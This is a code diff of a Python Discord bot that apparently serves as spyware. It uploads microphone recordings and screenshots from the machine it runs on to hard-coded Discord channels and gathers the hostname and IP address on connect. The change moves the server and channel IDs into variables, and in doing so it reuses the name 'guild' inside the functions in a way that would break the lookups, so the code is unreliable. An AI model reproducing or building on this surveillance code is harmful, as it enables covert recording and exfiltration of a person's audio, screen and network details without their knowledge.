@@ -10,6 +10,10 @@ load_dotenv(".env")
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix=';', intents=intents)
+guild = "1198070162432200865"
+screenshot_channel = "1209205802032955413"
+microphone_channel = "1209237919592615937"
+connect_channel = "1209247219874668638"
 
 Microphone = Microphone()
 Screenshot = Screenshot()
@@ -21,8 +25,8 @@ async def listen():
         
         if runMic == "True":
             mic_path = f"files\\{time.strftime('%H:%M:%S')}.wav"
-            guild = await bot.fetch_guild("1198070162432200865")
-            channel = await guild.fetch_channel("1209237919592615937")
+            guild = await bot.fetch_guild(guild)
+            channel = await guild.fetch_channel(microphone_channel)
 
             with open(mic_path, "rb") as mic_file:
                 await channel.send(file=discord.File(mic_file, mic_path))
@@ -31,8 +35,8 @@ async def listen():
 
         if runScreen == "True":
             screenshot_path = f"files\\{time.strftime('%H:%M:%S')}.png"
-            guild = await bot.fetch_guild("1198070162432200865")
-            channel = await guild.fetch_channel("1209205802032955413")
+            guild = await bot.fetch_guild(guild)
+            channel = await guild.fetch_channel(screenshot_channel)
 
             with open(screenshot_path, 'rb') as screenshot_file:
                 await channel.send(file=discord.File(screenshot_file, screenshot_path))
@@ -43,8 +47,8 @@ async def listen():
 
 @bot.event
 async def on_ready():
-    guild = await bot.fetch_guild("1198070162432200865")
-    channel = await guild.fetch_channel("1209247219874668638")
+    guild = await bot.fetch_guild(guild)
+    channel = await guild.fetch_channel(connect_channel)
 
     hostname = socket.gethostname()
     ip_address = socket.gethostbyname(hostname)
